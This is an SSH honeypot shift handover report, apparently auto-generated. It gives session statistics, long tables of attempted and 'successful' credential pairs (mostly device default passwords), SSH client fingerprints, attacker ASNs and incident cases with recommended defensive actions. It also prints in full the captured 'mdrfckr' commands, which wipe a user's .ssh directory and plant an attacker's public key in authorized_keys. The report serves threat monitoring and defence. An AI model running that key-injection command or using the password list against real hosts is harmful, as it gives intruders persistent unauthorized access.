# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-13 |
| **Generated At** | 2026-07-13T14:43:06Z |
| **Shift Time** | 14:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **533** |
| Confirmed Threats | **526** |
| False Positives Filtered | **7** (1.3%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **24** |
| High Severity Cases | **451** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **483** |
| Unique Credential Pairs | **201** |
| Unique Usernames | **59** |
| Unique Passwords | **178** |
| Successful Auth Pairs | **268** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `pi` | 196 |
| `root` | 124 |
| `admin` | 54 |
| `default` | 13 |
| `support` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `raspberry` | 196 |
| `admin` | 11 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `support` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `pi` | `raspberry` | 196 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `support` | `support` | 8 |
| `admin` | `admin` | 8 |
| `test` | `ubuntu` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Welcome_1` | `179.51.153.37` | 2026-07-13T10:55:31 |
| `345gs5662d34` | `345gs5662d34` | `179.51.153.37` | 2026-07-13T10:55:34 |
| `root` | `3245gs5662d34` | `179.51.153.37` | 2026-07-13T10:55:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `109.105.209.13` | 2026-07-13T10:56:29 |
| `support` | `support` | `176.53.159.196` | 2026-07-13T10:58:11 |
| `support` | `support` | `10.0.0.73` | 2026-07-13T10:59:32 |
| `admin` | `88888` | `218.95.73.31` | 2026-07-13T11:00:47 |
| `admin` | `88888` | `14.48.112.8` | 2026-07-13T11:00:56 |
| `admin` | `88888` | `10.0.0.73` | 2026-07-13T11:01:11 |
| `ftptest` | `ftptest@123` | `198.38.91.219` | 2026-07-13T11:07:24 |
| `345gs5662d34` | `345gs5662d34` | `198.38.91.219` | 2026-07-13T11:07:29 |
| `ftptest` | `3245gs5662d34` | `198.38.91.219` | 2026-07-13T11:07:31 |
| `root` | `qwerty1234` | `185.242.3.195` | 2026-07-13T11:07:36 |
| `dev` | `dev11` | `103.172.20.218` | 2026-07-13T11:09:48 |
| `345gs5662d34` | `345gs5662d34` | `103.172.20.218` | 2026-07-13T11:09:52 |
| `dev` | `3245gs5662d34` | `103.172.20.218` | 2026-07-13T11:09:54 |
| `dev` | `Welcome@2024` | `8.141.118.211` | 2026-07-13T11:10:23 |
| `345gs5662d34` | `345gs5662d34` | `8.141.118.211` | 2026-07-13T11:10:27 |
| `dev` | `3245gs5662d34` | `8.141.118.211` | 2026-07-13T11:10:29 |
| `root` | `951753` | `45.207.196.123` | 2026-07-13T11:11:33 |
| `345gs5662d34` | `345gs5662d34` | `45.207.196.123` | 2026-07-13T11:11:37 |
| `root` | `3245gs5662d34` | `45.207.196.123` | 2026-07-13T11:11:39 |
| `admin` | `supervisor` | `171.217.70.151` | 2026-07-13T11:17:06 |
| `admin` | `supervisor` | `10.0.0.73` | 2026-07-13T11:17:40 |
| `root` | `webadmin` | `92.255.196.185` | 2026-07-13T11:19:19 |
| `root` | `webadmin` | `117.158.166.73` | 2026-07-13T11:19:28 |
| `root` | `webadmin` | `10.0.0.73` | 2026-07-13T11:19:47 |
| `root` | `qwerty1234` | `10.0.0.73` | 2026-07-13T11:23:06 |
| `operator` | `abc123` | `61.184.128.210` | 2026-07-13T11:24:07 |
| `admin` | `admin` | `93.152.221.125` | 2026-07-13T11:24:10 |
| `root` | `` | `93.152.221.125` | 2026-07-13T11:24:11 |
| `admin` | `` | `93.152.221.125` | 2026-07-13T11:24:12 |
| `admin` | `123456` | `93.152.221.125` | 2026-07-13T11:24:13 |
| `root` | `12345` | `93.152.221.125` | 2026-07-13T11:24:14 |
| `admin` | `12345` | `93.152.221.125` | 2026-07-13T11:24:15 |
| `root` | `toor` | `93.152.221.125` | 2026-07-13T11:24:15 |
| `toor` | `root` | `93.152.221.125` | 2026-07-13T11:24:16 |
| `root` | `password` | `93.152.221.125` | 2026-07-13T11:24:17 |
| `admin` | `password` | `93.152.221.125` | 2026-07-13T11:24:18 |
| `root` | `Zte521` | `93.152.221.125` | 2026-07-13T11:24:18 |
| `operator` | `abc123` | `85.19.195.12` | 2026-07-13T11:24:19 |
| `root` | `xc3511` | `93.152.221.125` | 2026-07-13T11:24:19 |
| `root` | `vizxv` | `93.152.221.125` | 2026-07-13T11:24:20 |
| `root` | `realtek` | `93.152.221.125` | 2026-07-13T11:24:21 |
| `root` | `default` | `93.152.221.125` | 2026-07-13T11:24:22 |
| `default` | `default` | `93.152.221.125` | 2026-07-13T11:24:22 |
| `user` | `user` | `93.152.221.125` | 2026-07-13T11:24:23 |
| `guest` | `guest` | `93.152.221.125` | 2026-07-13T11:24:24 |
| `root` | `888888` | `93.152.221.125` | 2026-07-13T11:24:25 |
| `root` | `666666` | `93.152.221.125` | 2026-07-13T11:24:26 |
| `root` | `000000` | `93.152.221.125` | 2026-07-13T11:24:26 |
| `root` | `1111` | `93.152.221.125` | 2026-07-13T11:24:27 |
| `root` | `1234` | `93.152.221.125` | 2026-07-13T11:24:28 |
| `admin` | `1234` | `93.152.221.125` | 2026-07-13T11:24:29 |
| `root` | `changeme` | `93.152.221.125` | 2026-07-13T11:24:29 |
| `admin` | `changeme` | `93.152.221.125` | 2026-07-13T11:24:30 |
| `root` | `admin` | `93.152.221.125` | 2026-07-13T11:24:31 |
| `admin` | `root` | `93.152.221.125` | 2026-07-13T11:24:32 |
| `support` | `support` | `93.152.221.125` | 2026-07-13T11:24:32 |
| `tech` | `tech` | `93.152.221.125` | 2026-07-13T11:24:33 |
| `ubnt` | `ubnt` | `93.152.221.125` | 2026-07-13T11:24:34 |
| `root` | `7ujMko0vizxv` | `93.152.221.125` | 2026-07-13T11:24:35 |
| `root` | `7ujMko0admin` | `93.152.221.125` | 2026-07-13T11:24:35 |
| `root` | `klv123` | `93.152.221.125` | 2026-07-13T11:24:36 |
| `root` | `hi3518` | `93.152.221.125` | 2026-07-13T11:24:37 |
| `root` | `xmhdipc` | `93.152.221.125` | 2026-07-13T11:24:38 |
| `root` | `jvbzd` | `93.152.221.125` | 2026-07-13T11:24:38 |
| `root` | `antslq` | `93.152.221.125` | 2026-07-13T11:24:39 |
| `default` | `OxhlwSG8` | `93.152.221.125` | 2026-07-13T11:24:40 |
| `default` | `S2fGqNFs` | `93.152.221.125` | 2026-07-13T11:24:41 |
| `default` | `lJwpbo6` | `93.152.221.125` | 2026-07-13T11:24:42 |
| `root` | `system` | `93.152.221.125` | 2026-07-13T11:24:42 |
| `Administrator` | `admin` | `93.152.221.125` | 2026-07-13T11:24:43 |
| `root` | `12345678` | `93.152.221.125` | 2026-07-13T11:24:44 |
| `root` | `123456789` | `93.152.221.125` | 2026-07-13T11:24:45 |
| `admin` | `12345678` | `93.152.221.125` | 2026-07-13T11:24:46 |
| `operator` | `abc123` | `219.129.236.174` | 2026-07-13T11:28:08 |
| `root` | `Mm123123` | `10.0.0.73` | 2026-07-13T11:30:46 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-13T11:30:49 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T11:30:51 |
| `erfan` | `erfan@123` | `10.0.0.73` | 2026-07-13T11:36:39 |
| `erfan` | `3245gs5662d34` | `10.0.0.73` | 2026-07-13T11:36:42 |
| `andres` | `andres` | `103.143.231.2` | 2026-07-13T11:38:27 |
| `345gs5662d34` | `345gs5662d34` | `103.143.231.2` | 2026-07-13T11:38:29 |
| `andres` | `3245gs5662d34` | `103.143.231.2` | 2026-07-13T11:38:30 |
| `admin` | `admin` | `118.26.111.107` | 2026-07-13T11:41:22 |
| `root` | `Pon521` | `94.154.43.243` | 2026-07-13T11:41:23 |
| `root` | `Zte521` | `94.154.43.243` | 2026-07-13T11:41:33 |
| `root` | `root621` | `94.154.43.243` | 2026-07-13T11:41:43 |
| `root` | `vizxv` | `94.154.43.243` | 2026-07-13T11:41:53 |
| `root` | `oelinux123` | `94.154.43.243` | 2026-07-13T11:42:03 |
| `root` | `wabjtam` | `94.154.43.243` | 2026-07-13T11:42:14 |
| `root` | `newroot` | `210.4.68.73` | 2026-07-13T11:42:20 |
| `root` | `Zxic521` | `94.154.43.243` | 2026-07-13T11:42:24 |
| `root` | `newroot` | `182.75.197.174` | 2026-07-13T11:42:29 |
| `root` | `tsgoingon` | `94.154.43.243` | 2026-07-13T11:42:34 |
| `root` | `xc3511` | `94.154.43.243` | 2026-07-13T11:42:44 |
| `carol` | `carol` | `185.242.3.195` | 2026-07-13T11:42:51 |
| `root` | `solokey` | `94.154.43.243` | 2026-07-13T11:42:54 |
| `root` | `default` | `94.154.43.243` | 2026-07-13T11:43:05 |
| `root` | `a1sev5y7c39k` | `94.154.43.243` | 2026-07-13T11:43:15 |
| `root` | `hkipc2016` | `94.154.43.243` | 2026-07-13T11:43:25 |
| `root` | `unisheen` | `94.154.43.243` | 2026-07-13T11:43:35 |
| `root` | `Fireitup` | `94.154.43.243` | 2026-07-13T11:43:45 |
| `root` | `hslwificam` | `94.154.43.243` | 2026-07-13T11:43:55 |
| `root` | `5up` | `94.154.43.243` | 2026-07-13T11:44:05 |
| `root` | `jvbzd` | `94.154.43.243` | 2026-07-13T11:44:15 |
| `root` | `1111` | `10.0.0.73` | 2026-07-13T11:44:18 |
| `root` | `1001chin` | `94.154.43.243` | 2026-07-13T11:44:25 |
| `root` | `system` | `94.154.43.243` | 2026-07-13T11:44:35 |
| `root` | `zlxx.` | `94.154.43.243` | 2026-07-13T11:44:46 |
| `root` | `admin` | `94.154.43.243` | 2026-07-13T11:44:56 |
| `root` | `7ujMko0vizxv` | `94.154.43.243` | 2026-07-13T11:45:06 |
| `root` | `1234horses` | `94.154.43.243` | 2026-07-13T11:45:16 |
| `root` | `antslq` | `94.154.43.243` | 2026-07-13T11:45:26 |
| `root` | `xc12345` | `94.154.43.243` | 2026-07-13T11:45:36 |
| `root` | `xmhdipc` | `94.154.43.243` | 2026-07-13T11:45:46 |
| `root` | `icatch99` | `94.154.43.243` | 2026-07-13T11:45:56 |
| `root` | `founder88` | `94.154.43.243` | 2026-07-13T11:46:06 |
| `root` | `newroot` | `10.0.0.73` | 2026-07-13T11:46:07 |
| `root` | `xirtam` | `94.154.43.243` | 2026-07-13T11:46:16 |
| `root` | `taZz@01` | `94.154.43.243` | 2026-07-13T11:46:26 |
| `root` | `/*6.=_ja` | `94.154.43.243` | 2026-07-13T11:46:36 |
| `root` | `12345` | `94.154.43.243` | 2026-07-13T11:46:47 |
| `root` | `t0talc0ntr0l4!` | `94.154.43.243` | 2026-07-13T11:46:57 |
| `root` | `7ujMko0admin` | `94.154.43.243` | 2026-07-13T11:47:07 |
| `root` | `telecomadmin` | `94.154.43.243` | 2026-07-13T11:47:17 |
| `root` | `ipcam_rt5350` | `94.154.43.243` | 2026-07-13T11:47:27 |
| `root` | `﻿------fuck------` | `180.76.168.116` | 2026-07-13T11:47:34 |
| `root` | `juantech` | `94.154.43.243` | 2026-07-13T11:47:37 |
| `root` | `1234` | `94.154.43.243` | 2026-07-13T11:47:47 |
| `root` | `dreambox` | `94.154.43.243` | 2026-07-13T11:47:57 |
| `root` | `IPCam@sw` | `94.154.43.243` | 2026-07-13T11:48:07 |
| `root` | `zhongxing` | `94.154.43.243` | 2026-07-13T11:48:17 |
| `root` | `hi3518` | `94.154.43.243` | 2026-07-13T11:48:28 |
| `root` | `hg2x0` | `94.154.43.243` | 2026-07-13T11:48:38 |
| `root` | `dropper` | `94.154.43.243` | 2026-07-13T11:48:48 |
| `root` | `ipc71a` | `94.154.43.243` | 2026-07-13T11:48:58 |
| `root` | `root123` | `94.154.43.243` | 2026-07-13T11:49:08 |
| `root` | `telnet` | `94.154.43.243` | 2026-07-13T11:49:18 |
| `root` | `ipcam` | `94.154.43.243` | 2026-07-13T11:49:28 |
| `root` | `grouter` | `94.154.43.243` | 2026-07-13T11:49:38 |
| `root` | `GM8182` | `94.154.43.243` | 2026-07-13T11:49:48 |
| `root` | `20080826` | `94.154.43.243` | 2026-07-13T11:49:58 |
| `root` | `3ep5w2u` | `94.154.43.243` | 2026-07-13T11:50:08 |
| `admin` | `root` | `94.154.43.243` | 2026-07-13T11:50:19 |
| `admin` | `admin` | `94.154.43.243` | 2026-07-13T11:50:29 |
| `admin` | `admin123` | `94.154.43.243` | 2026-07-13T11:50:39 |
| `admin` | `1234` | `94.154.43.243` | 2026-07-13T11:50:49 |
| `admin` | `admin1234` | `94.154.43.243` | 2026-07-13T11:50:59 |
| `admin` | `12345` | `94.154.43.243` | 2026-07-13T11:51:09 |
| `admin` | `admin@123` | `94.154.43.243` | 2026-07-13T11:51:19 |
| `admin` | `BrAhMoS@15` | `94.154.43.243` | 2026-07-13T11:51:29 |
| `admin` | `GeNeXiS@19` | `94.154.43.243` | 2026-07-13T11:51:39 |
| `admin` | `firetide` | `94.154.43.243` | 2026-07-13T11:51:49 |
| `admin` | `2601hx` | `94.154.43.243` | 2026-07-13T11:51:59 |
| `admin` | `service` | `94.154.43.243` | 2026-07-13T11:52:10 |
| `admin` | `password` | `94.154.43.243` | 2026-07-13T11:52:20 |
| `supportadmin` | `supportadmin` | `94.154.43.243` | 2026-07-13T11:52:30 |
| `telnetadmin` | `telnetadmin` | `94.154.43.243` | 2026-07-13T11:52:40 |
| `telecomadmin` | `admintelecom` | `94.154.43.243` | 2026-07-13T11:52:50 |
| `guest` | `guest` | `94.154.43.243` | 2026-07-13T11:53:00 |
| `ftp` | `ftp` | `94.154.43.243` | 2026-07-13T11:53:10 |
| `user` | `user` | `94.154.43.243` | 2026-07-13T11:53:20 |
| `guest` | `12345` | `94.154.43.243` | 2026-07-13T11:53:31 |
| `nobody` | `nobody` | `94.154.43.243` | 2026-07-13T11:53:41 |
| `daemon` | `daemon` | `94.154.43.243` | 2026-07-13T11:53:51 |
| `default` | `1cDuLJ7c` | `94.154.43.243` | 2026-07-13T11:54:01 |
| `default` | `tlJwpbo6` | `94.154.43.243` | 2026-07-13T11:54:11 |
| `ubnt` | `ubnt11` | `65.20.204.41` | 2026-07-13T11:54:13 |
| `default` | `S2fGqNFs` | `94.154.43.243` | 2026-07-13T11:54:21 |
| `default` | `OxhlwSG8` | `94.154.43.243` | 2026-07-13T11:54:31 |
| `default` | `12345` | `94.154.43.243` | 2026-07-13T11:54:41 |
| `default` | `default` | `94.154.43.243` | 2026-07-13T11:54:52 |
| `default` | `lJwpbo6` | `94.154.43.243` | 2026-07-13T11:55:02 |
| `default` | `tluafed` | `94.154.43.243` | 2026-07-13T11:55:12 |
| `guest` | `123456` | `94.154.43.243` | 2026-07-13T11:55:22 |
| `bin` | `bin` | `94.154.43.243` | 2026-07-13T11:55:32 |
| `vstarcam2015` | `20150602` | `94.154.43.243` | 2026-07-13T11:55:42 |
| `support` | `support` | `94.154.43.243` | 2026-07-13T11:55:52 |
| `hikvision` | `hikvision` | `94.154.43.243` | 2026-07-13T11:56:02 |
| `default` | `antslq` | `94.154.43.243` | 2026-07-13T11:56:12 |
| `e8ehomeasb` | `e8ehomeasb` | `94.154.43.243` | 2026-07-13T11:56:22 |
| `e8ehome` | `e8ehome` | `94.154.43.243` | 2026-07-13T11:56:32 |
| `e8telnet` | `e8telnet` | `94.154.43.243` | 2026-07-13T11:56:43 |
| `support` | `1234` | `94.154.43.243` | 2026-07-13T11:56:53 |
| `cisco` | `cisco` | `94.154.43.243` | 2026-07-13T11:57:03 |
| `admin` | `Xpon@Olt9417#` | `94.154.43.243` | 2026-07-13T11:57:13 |
| `useradmin` | `Zxic521!` | `94.154.43.243` | 2026-07-13T11:57:23 |
| `admin` | `stdONUi0i` | `94.154.43.243` | 2026-07-13T11:57:33 |
| `Alphanetworks` | `Wj5eH%JC` | `94.154.43.243` | 2026-07-13T11:57:43 |
| `Manager` | `friend` | `94.154.43.243` | 2026-07-13T11:57:54 |
| `dnsekakf2$$` | `dnsekakf2$$` | `94.154.43.243` | 2026-07-13T11:58:04 |
| `admin` | `dnsekakf2$$` | `94.154.43.243` | 2026-07-13T11:58:14 |
| `admin` | `vertex25ektks123` | `94.154.43.243` | 2026-07-13T11:58:24 |
| `admin` | `amplifier` | `94.154.43.243` | 2026-07-13T11:58:34 |
| `carol` | `carol` | `10.0.0.73` | 2026-07-13T11:58:37 |
| `useradmin` | `TJ2100Npassword` | `94.154.43.243` | 2026-07-13T11:58:44 |
| `admin` | `TeleCom_1234` | `94.154.43.243` | 2026-07-13T11:58:54 |
| `test1` | `test1` | `94.154.43.243` | 2026-07-13T11:59:04 |
| `admin` | `switch` | `94.154.43.243` | 2026-07-13T11:59:14 |
| `admin` | `1q2w3e` | `94.154.43.243` | 2026-07-13T11:59:24 |
| `telecom` | `telecom` | `94.154.43.243` | 2026-07-13T11:59:34 |
| `admin` | `2oiidxii22` | `94.154.43.243` | 2026-07-13T11:59:45 |
| `admin` | `123456789abc` | `94.154.43.243` | 2026-07-13T11:59:55 |
| `admin` | `huigu309` | `94.154.43.243` | 2026-07-13T12:00:05 |
| `usradmin` | `usradmin` | `94.154.43.243` | 2026-07-13T12:00:15 |
| `admin` | `IUSACEL` | `94.154.43.243` | 2026-07-13T12:00:25 |
| `admin` | `QwestM0dem` | `94.154.43.243` | 2026-07-13T12:00:36 |
| `device` | `device` | `94.154.43.243` | 2026-07-13T12:00:46 |
| `Geardog` | `Geardog` | `94.154.43.243` | 2026-07-13T12:00:56 |
| `GlobalAdmin` | `GlobalAdmin` | `94.154.43.243` | 2026-07-13T12:01:06 |
| `localadmin` | `localadmin` | `94.154.43.243` | 2026-07-13T12:01:16 |
| `locate` | `locatepw` | `94.154.43.243` | 2026-07-13T12:01:27 |
| `admin` | `zhongxing` | `94.154.43.243` | 2026-07-13T12:01:37 |
| `root` | `uFwfBht5` | `94.154.43.243` | 2026-07-13T12:01:47 |
| `admin` | `VnT3ch@dm1n` | `94.154.43.243` | 2026-07-13T12:01:57 |
| `telecomadmin` | `ADMIN` | `94.154.43.243` | 2026-07-13T12:02:08 |
| `root` | `arris` | `94.154.43.243` | 2026-07-13T12:02:18 |
| `root` | `alitvadmin` | `94.154.43.243` | 2026-07-13T12:02:28 |
| `root` | `zmHDc0m` | `94.154.43.243` | 2026-07-13T12:02:39 |
| `admin` | `88888888` | `94.154.43.243` | 2026-07-13T12:02:49 |
| `epuser` | `epuser` | `94.154.43.243` | 2026-07-13T12:03:10 |
| `admin` | `instar` | `94.154.43.243` | 2026-07-13T12:03:20 |
| `root` | `star123` | `94.154.43.243` | 2026-07-13T12:03:30 |
| `admin` | `adtran!` | `94.154.43.243` | 2026-07-13T12:03:41 |
| `cisco` | `cisco123` | `94.154.43.243` | 2026-07-13T12:03:51 |
| `root` | `admintelecom1` | `94.154.43.243` | 2026-07-13T12:04:01 |
| `oltuser` | `olt!pass` | `94.154.43.243` | 2026-07-13T12:04:12 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-13T12:04:13 |
| `installer` | `fiberinst` | `94.154.43.243` | 2026-07-13T12:04:22 |
| `haver` | `haver123` | `94.154.43.243` | 2026-07-13T12:04:32 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-13T12:04:37 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-13T12:04:37 |
| `on_support` | `fh1234` | `94.154.43.243` | 2026-07-13T12:04:43 |
| `boards` | `boards123` | `94.154.43.243` | 2026-07-13T12:04:53 |
| `onuser` | `onuser123` | `94.154.43.243` | 2026-07-13T12:05:03 |
| `support_gp` | `tplinkgp` | `94.154.43.243` | 2026-07-13T12:05:13 |
| `Epadmin` | `adminEp` | `94.154.43.243` | 2026-07-13T12:05:23 |
| `service` | `serviceC0mp!` | `94.154.43.243` | 2026-07-13T12:05:34 |
| `dylan` | `dylan@123` | `14.103.127.2` | 2026-07-13T12:06:12 |
| `unknown` | `qwerty1` | `213.230.65.53` | 2026-07-13T12:06:57 |
| `unknown` | `qwerty1` | `39.183.162.243` | 2026-07-13T12:07:23 |
| `root` | `123456a` | `200.232.114.71` | 2026-07-13T12:08:24 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-13T12:08:29 |
| `root` | `123456a` | `60.174.35.18` | 2026-07-13T12:12:06 |
| `root` | `123456a` | `65.20.233.110` | 2026-07-13T12:12:15 |
| `root` | `123456a` | `10.0.0.73` | 2026-07-13T12:12:35 |
| `fred` | `fred` | `185.242.3.195` | 2026-07-13T12:18:58 |
| `root` | `openelec` | `81.214.38.139` | 2026-07-13T12:20:43 |
| `root` | `openelec` | `219.129.236.174` | 2026-07-13T12:20:53 |
| `root` | `openelec` | `10.0.0.73` | 2026-07-13T12:21:08 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-13T12:25:56 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-13T12:25:57 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-13T12:28:56 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-13T12:28:56 |
| `pi` | `raspberry` | `27.42.87.156` | 2026-07-13T12:31:18 |
| `root` | `TESTDUPS` | `178.177.12.245` | 2026-07-13T12:33:07 |
| `test` | `ubuntu` | `111.70.10.15` | 2026-07-13T12:33:45 |
| `debian` | `password123` | `150.228.225.198` | 2026-07-13T12:35:31 |
| `debian` | `password123` | `120.224.15.67` | 2026-07-13T12:35:45 |
| `fred` | `fred` | `10.0.0.73` | 2026-07-13T12:35:53 |
| `test` | `ubuntu` | `222.75.225.206` | 2026-07-13T12:37:20 |
| `test` | `ubuntu` | `118.122.196.230` | 2026-07-13T12:37:30 |
| `test` | `ubuntu` | `10.0.0.73` | 2026-07-13T12:37:40 |
| `admin` | `abcd@1234` | `49.124.151.7` | 2026-07-13T12:47:53 |
| `admin` | `abcd@1234` | `223.99.212.58` | 2026-07-13T12:48:04 |
| `admin` | `abcd@1234` | `10.0.0.73` | 2026-07-13T12:48:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **533** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 225 |
| libssh | 30 |
| Go SSH scanner | 13 |
| Paramiko (Python) | 6 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `eeca2460550b...` | libssh-based | 196 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 28 | 27 |
| `f555226df196...` | Mirai/variant | 17 | 6 |
| `16443846184e...` | Generic scanner | 6 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `eeca2460550b...` | OpenSSH | 196 | 1 | libssh-based |
| `acaa53e0a7d7...` | OpenSSH | 28 | 27 | Mirai/variant |
| `f555226df196...` | libssh | 17 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 3 | — |
| `16443846184e...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 4 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **202** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.172.20.218`, `45.207.196.123`, `179.51.153.37`, `198.38.91.219`, `14.103.127.2`, `8.141.118.211`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **46** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS21859` | Zenlayer Inc | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS24444` | Shandong Mobile Communication Company Limited | 2 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (451)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-62f529c2f8db

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-07-13 10:55 |
| **Last Seen** | 2026-07-13 10:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 10:55:30` | `cowrie.session.connect` |
| `2026-07-13 10:55:30` | `cowrie.client.version` |
| `2026-07-13 10:55:31` | `cowrie.client.kex` |
| `2026-07-13 10:55:31` | `cowrie.login.success` |
| `2026-07-13 10:55:32` | `cowrie.session.params` |
| `2026-07-13 10:55:32` | `cowrie.command.input` |
| `2026-07-13 10:55:32` | `cowrie.command.failed` |
| `2026-07-13 10:55:32` | `cowrie.log.closed` |
| `2026-07-13 10:55:33` | `cowrie.session.params` |
| `2026-07-13 10:55:33` | `cowrie.command.input` |
| `2026-07-13 10:55:33` | `cowrie.session.file_download` |
| `2026-07-13 10:55:33` | `cowrie.log.closed` |
| `2026-07-13 10:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952e41565c97

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-07-13 10:55 |
| **Last Seen** | 2026-07-13 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 10:55:33` | `cowrie.session.connect` |
| `2026-07-13 10:55:33` | `cowrie.client.version` |
| `2026-07-13 10:55:33` | `cowrie.client.kex` |
| `2026-07-13 10:55:34` | `cowrie.login.success` |
| `2026-07-13 10:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
